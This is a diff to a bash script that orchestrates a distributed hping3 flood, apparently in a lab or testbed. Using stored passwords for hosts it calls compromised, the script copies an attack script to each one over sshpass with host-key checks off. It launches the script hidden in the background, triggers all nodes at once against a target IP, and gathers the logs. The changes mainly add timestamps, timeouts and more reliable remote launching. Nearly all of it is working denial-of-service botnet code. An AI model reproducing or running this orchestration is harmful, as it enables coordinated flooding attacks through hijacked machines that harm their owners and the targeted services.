@@ -90,13 +90,12 @@ echo "[*] Nodes: ${COMPROMISED_IPS[*]}"
 echo "[*] ============================================"
 
 # Phase 4a: DEPLOY — copy hping3_attack.sh to ALL compromised nodes
-# The script is deployed but NOT run yet — it will wait for the trigger.
-echo "[*] Phase 4a: Deploying hping3 attack script to all compromised nodes..."
+echo "[$(date +%T.%N)] Phase 4a: Deploying hping3 attack script to ${#COMPROMISED_IPS[@]} compromised nodes..."
 for target in "${COMPROMISED_IPS[@]}"; do
   PASSWORD="${COMPROMISED_PWDS[$target]}"
-  echo "[*] Deploying to $target..."
+  echo "[$(date +%T.%N)] Phase 4a: Deploying to $target..."
   sshpass -p "$PASSWORD" scp -o StrictHostKeyChecking=no /app/hping3_attack.sh "$SSH_USER@$target:/tmp/hping3_attack.sh" 2>&1 | tee -a /app/results/deployment.log
-  echo "[+] Deployed to $target"
+  echo "[$(date +%T.%N)] [+] Deployed to $target"
 done
 
 # Phase 4b: LAUNCH — start hping3_attack.sh in background on each node
@@ -104,41 +103,46 @@ done
 echo "[*] Phase 4b: Launching hping3_attack.sh in background on all nodes..."
 for target in "${COMPROMISED_IPS[@]}"; do
   PASSWORD="${COMPROMISED_PWDS[$target]}"
-  sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no "$SSH_USER@$target" \
-    "chmod +x /tmp/hping3_attack.sh && ATTACK_TARGET_IP=$ATTACK_TARGET_IP ATTACK_START=$ATTACK_START ATTACK_STOP=$ATTACK_STOP nohup bash /tmp/hping3_attack.sh $ATTACK_TARGET_IP $ATTACK_START $ATTACK_STOP < /dev/null > /tmp/hping3.log 2>&1 &" \
-    2>&1 | tee -a /app/results/deployment.log
-  echo "[+] hping3_attack.sh launched in background on $target"
+  echo "[$(date +%T.%N)] Phase 4b: Launching on $target (IP=$ATTACK_TARGET_IP START=$ATTACK_START STOP=$ATTACK_STOP)..."
+  # Use timeout as safety net (30s). Heredoc avoids quoting issues.
+  # Chain: timeout -> sshpass -> ssh. Also add SSH ConnectTimeout.
+  timeout 30 sshpass -p "$PASSWORD" ssh -T -o StrictHostKeyChecking=no -o ConnectTimeout=10 "$SSH_USER@$target" <<EOF
+chmod +x /tmp/hping3_attack.sh
+nohup bash /tmp/hping3_attack.sh $ATTACK_TARGET_IP $ATTACK_START $ATTACK_STOP </dev/null >/tmp/hping3.log 2>&1 &
+disown
+EOF
+  RC=$?
+  echo "[$(date +%T.%N)] [+] hping3_attack.sh launched on $target (SSH exit code: $RC)"
 done
 
 # Brief stagger to ensure background processes are ready on all nodes
 sleep 1
+echo "[$(date +%T.%N)] Stagger complete. Proceeding to trigger..."
 
 # Phase 5: TRIGGER — synchronized start on ALL nodes at once
-# Create /tmp/.hping3_start on every compromised node simultaneously.
-# All nodes wake up at the same instant and start hping3 flooding.
-echo "[*] Phase 5: Triggering synchronized hping3 attack on all nodes..."
+echo "[$(date +%T.%N)] Phase 5: Triggering synchronized hping3 attack on ${#COMPROMISED_IPS[@]} nodes..."
 for target in "${COMPROMISED_IPS[@]}"; do
   PASSWORD="${COMPROMISED_PWDS[$target]}"
-  sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no "$SSH_USER@$target" \
+  echo "[$(date +%T.%N)] Phase 5: Sending trigger to $target..."
+  sshpass -p "$PASSWORD" ssh -T -o StrictHostKeyChecking=no "$SSH_USER@$target" \
     "touch /tmp/.hping3_start" 2>&1 &
 done
 wait  # Wait for all trigger commands to finish
-
-echo "[*] All compromised nodes triggered simultaneously."
-echo "[*] Attack window: T+${ATTACK_START}s to T+${ATTACK_STOP}s"
+echo "[$(date +%T.%N)] All compromised nodes triggered simultaneously."
+echo "[$(date +%T.%N)] Attack window: T+${ATTACK_START}s to T+${ATTACK_STOP}s"
 
 # Phase 6: Wait for attack to finish, then verify
-echo "[*] Waiting for attack to complete..."
+echo "[$(date +%T.%N)] Phase 6: Waiting for attack to complete (T+${ATTACK_STOP}s)..."
 sleep $((ATTACK_STOP + 5))
 
-echo "[*] Verifying attack results..."
+echo "[$(date +%T.%N)] Phase 6: Verifying attack results..."
 for target in "${COMPROMISED_IPS[@]}"; do
   PASSWORD="${COMPROMISED_PWDS[$target]}"
   echo "--- Results from $target ---"
-  sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no "$SSH_USER@$target" \
+  sshpass -p "$PASSWORD" ssh -T -o StrictHostKeyChecking=no "$SSH_USER@$target" \
     "cat /var/log/hping3_attack.log 2>/dev/null; cat /tmp/hping3.log 2>/dev/null" 2>&1 | tee -a /app/results/deployment.log
 done
 
-echo "[*] ============================================"
-echo "[*] Attack orchestration complete"
-echo "[*] ============================================"
+echo "[$(date +%T.%N)] ============================================"
+echo "[$(date +%T.%N)] Attack orchestration complete"
+echo "[$(date +%T.%N)] ============================================"
